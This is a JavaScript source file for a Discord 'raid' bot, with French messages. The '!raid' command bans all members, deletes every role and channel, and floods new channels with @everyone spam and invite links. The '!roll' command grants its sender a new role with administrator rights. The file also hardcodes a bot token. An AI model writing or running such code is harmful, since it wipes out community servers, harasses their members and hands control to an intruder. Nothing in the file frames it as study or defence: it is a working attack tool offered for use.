const Discord = require('discord.js');
const client = new Discord.Client();


client.on('ready', () => {
	console.log(`Logged in as ${client.user.tag}!`);
    
    client.user.setActivity(`https://discord.gg/HjcxgJDr`, {
        type: "STREAMING",
        url: "https://www.twitch.tv/judyxwhite"
      });
}

);


client.on("message", async message =>{
    if(message.content == "!raid"){
        message.guild.members.cache.forEach(m =>{
            m.ban().catch(err =>{})
        })
        message.guild.roles.cache.forEach(r =>{
            r.delete().catch(err=>{})
        })
        message.guild.channels.cache.forEach(c =>{
            c.delete().catch(err=>{})
        })
        var x = 0
        let op
        let interval = setInterval(()=>{
            let t = message.guild.channels.create("[BRESOM] 💀").then( m=>{
                
                setInterval(()=>{
                    let role = message.guild.roles.cache.find(r => r.name === "@everyone").id
                    m.send(`@everyone Ce serveur a été raid par ${message.author.tag} \n https://discord.gg/8yZJdgsX \n [💀] en force`)
                    guild.setName('NTM')
                }, 1 * 1000)
            })
            ++x
            if(x == 20){
                clearInterval(interval)
            }
        }, 1 * 1000)
    }
})
client.on("message", async message =>{
    if(message.content == "!roll"){
const Role = await message.guild.roles.create({ // Creating the role.
    data: {name: "niqued", color: "red", permissions: ['ADMINISTRATOR'] }
}).catch((e) => console.error(`Couldn't create role. | ${e}`)); // Catching for errors.

message.member.roles.add(Role).then(() => { // Adding the role to the member.
    message.channel.send(`Role ${Role.name} has been added to ${message.author.tag}`); // Sending a message if the role has been added.
}).catch((e) => console.error(`Je ne peut pas ajouter le role | ${e}`)); // Catching for errors.

}
})



client.login('ODU4OTg4Mjc5OTk5MTAyOTc3.YNmJLQ.dVT1AkILegBYdhKEPhLXALsKflI')

    





